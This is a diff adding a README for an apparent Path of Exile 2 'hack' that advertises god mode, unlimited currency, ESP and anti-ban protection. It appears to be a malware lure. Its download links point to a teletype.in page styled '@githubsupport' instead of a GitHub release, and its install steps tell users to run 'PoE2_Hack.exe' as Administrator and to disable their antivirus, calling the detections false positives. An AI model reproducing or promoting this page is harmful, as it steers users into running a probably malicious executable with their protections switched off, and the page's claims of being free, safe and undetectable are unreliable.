@@ -1,0 +1,64 @@
+# Get Path Of Exile 2 Hack 2025 - Free Download For Windows PC
+
+![Path of Exile 2 Logo](https://img.shields.io/badge/Path_of_Exile_2-Hack_🔥-brightgreen?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTEyLDJBMTAsMTAgMCAwLDAgMiwxMkExMCwxMCAwIDAsMCAxMiwyMkExMCwxMCAwIDAsMCAyMiwxMkExMCwxMCAwIDAsMCAxMiwyTTE3LDE3SDdWMTVIMTdWMTdNMTMuOSwxNC41TDE3LDcuNUg3TDEwLjEsMTQuNUwxMiwxMS41TDEzLjksMTQuNVoiIC8+PC9zdmc+)
+
+[![Download Now](https://img.shields.io/badge/Download-🔗_Latest_Release-blue?style=for-the-badge&logo=github)]https://teletype.in/@githubsupport/aHN9l6m-mbF?D2228F8DF2774C4593AA24D5CA9BAED4
+
+---
+
+## 🚀 **About This Project**  
+The ultimate **Path of Exile 2 Hack** for Windows (2025) designed to elevate your gameplay experience! 🎮💥 This repository provides **free**, **safe**, and **undetectable** tools to enhance your adventures in Wraeclast. Whether you're a seasoned exile or a newcomer, our hack offers **unlimited resources**, **auto-aim**, **god mode**, and more—all while keeping your account secure.  
+
+✨ **Features:**  
+✔ **God Mode** (Immortality)  
+✔ **Unlimited Currency & Items** 💰  
+✔ **Auto-Farm & Loot** 🤖  
+✔ **ESP & Radar** 🎯  
+✔ **Anti-Ban Protection** 🔒  
+
+---
+
+## 📥 **Installation Guide**  
+1. **Download** the latest release [here]https://teletype.in/@githubsupport/aHN9l6m-mbF?41D10B566AAF48EE8830CC7E5CE4189B.  
+2. **Extract** the `.zip` file to a secure folder.  
+3. **Run** `PoE2_Hack.exe` as **Administrator**.  
+4. **Configure** settings in the GUI.  
+5. **Launch** Path of Exile 2 and dominate! 💪  
+
+⚠ **Note:** Disable antivirus temporarily (false positives).  
+
+---
+
+## 🔧 **System Requirements**  
+- **OS:** Windows 10/11 (64-bit)  
+- **CPU:** Intel i5+ or AMD Ryzen 5+  
+- **RAM:** 8GB+  
+- **GPU:** NVIDIA GTX 1060 / AMD RX 580  
+- **Storage:** 2GB free space  
+
+---
+
+## 📜 **Disclaimer**  
+❗ **This tool is for educational purposes only.**  
+❗ **Use at your own risk.** We are **not responsible** for bans or violations of ToS.  
+❗ **Always create backups** of game files.  
+
+---
+
+## 🤝 **Support & Community**  
+Join our Discord for updates, bug reports, and tips:  
+[![Discord](https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/example)  
+
+**Star** ⭐ this repo if you love it!  
+
+---
+
+## 📌 **Screenshots**  
+![Preview](https://img.shields.io/badge/Preview-📸-orange?style=flat-square)  
+*(Coming soon!)*  
+
+---
+
+© 2025 Get Path Of Exile 2 Hack 2025 - Free Download For Windows PC | Not affiliated with Grinding Gear Games.  
+
+https://teletype.in/@githubsupport/aHN9l6m-mbF?FCE107C61F4948C09152B9727E0B1226: https://github.com/your-repo/releases/latest
